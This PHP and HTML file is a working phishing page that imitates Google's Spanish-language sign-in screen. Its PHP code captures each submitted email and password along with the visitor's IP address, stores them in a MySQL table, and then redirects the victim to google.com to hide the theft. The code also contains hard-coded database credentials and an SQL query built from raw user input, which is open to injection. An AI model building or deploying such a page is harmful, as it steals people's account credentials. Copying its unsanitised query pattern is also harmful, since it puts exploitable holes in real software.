<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

//echo "<h1> Pagina del registro</h1>";
$servername = "localhost";
$database = "aloxploitDatabase";
$username = "aloxploit";
$password = "alox123";


// creamos conexion
  $conn = mysqli_connect($servername, $username, $password, $database);
//si estan todos los campos rellenos los insertamos en la base de datos
  if( isset($_GET["email"]) && isset($_GET["pass"]) && isset($_SERVER["REQUEST_METHOD"]) ){
$pass = $_GET["pass"];
$mail = $_GET["email"];
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
        }


  $insert = "insert into datos values('$mail', '$pass','Google','$ipAddress')";
//realizamos consulta para insertar los datos
  $return = mysqli_query( $conn, $insert);
  print_r( ( $return));
 // echo " : Registro correcto";
        header("Location: https://www.google.com/");
        exit();
}
mysqli_close( $conn);
?>


<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 330px;
            text-align: center;
        }

        .logo {
            height: 32px;
            margin-bottom: 20px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 20px;
            margin-bottom: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
            box-sizing: border-box;
            font-size: 14px;
        }

        button {
            background-color: #4285f4;
            color: #fff;
            padding: 12px 20px;
            margin-bottom: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        button:hover {
            background-color: #357ae8;
        }

        .links {
            margin-top: 20px;
        }

        .forgot-password {
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .other-options {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
        }

        .other-options a {
            color: #4285f4;
            text-decoration: none;
            margin-left: 5px;
        }
        .container h2 {

            font-family:  font-family: 'Open Sans', sans-serif;

            font-weight: 10;

            font-size: 24px;

            line-height: 1.4;

            margin-top: 10px;

            margin-bottom: 10px;

        }

        .other-options a:hover {
            text-decoration: underline;
        }
.footer-links {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px;
    background-color: #f2f2f2;
    border-top: 1px solid #ddd;
}

.footer-links span {
    font-size: 14px;
    font-weight: bold;
}

.footer-links a {
    color: #444;
    text-decoration: none;
    font-size: 14px;
}

.footer-links a:hover {
    text-decoration: underline;
}
 .wrapper {
            display: flex;
            flex-direction: column;
        }
    </style>
</head>
<body>
    <div class="wrapper">
    <div class="container">
        <img class="logo" src="google.png" alt="Logo" style="max-width: 100%; height: auto; width: 120px;">
        <h2>Iniciar sesión</h2>
        <form action="google.php" method="GET">
            <input type="email" name="email" id="email" placeholder="Correo electrónico o teléfono" required>
            <input type="password" name="pass" id="pass" placeholder="Contraseña" required>
            <div class="links">
                <button type="submit">Iniciar sesión</button>
		</div>
		<div>
                <a class="forgot-password" href="forgot-password.html">¿Has olvidado tu contraseña?</a>
            </div>
        </form>
        <div class="other-options">
            <span>¿No es tu ordenador?</span>
            <a href="private-window.html">Usa una ventana privada para iniciar sesión.</a>
            <span>Más información sobre cómo usar el modo Invitado</span>
        </div>
        <p>
	<div>
            <span>¿No tienes una cuenta?</span>
            <a href="signup.html">Crear cuenta</a>
        </div>
    </div>

	 <div class="footer-links">

        <span>Español (España)</span>

        <a href="#">Ayuda</a>

        <a href="#">Privacidad</a>

        <a href="#">Términos</a>

    </div>
</div>
</body>
</html>
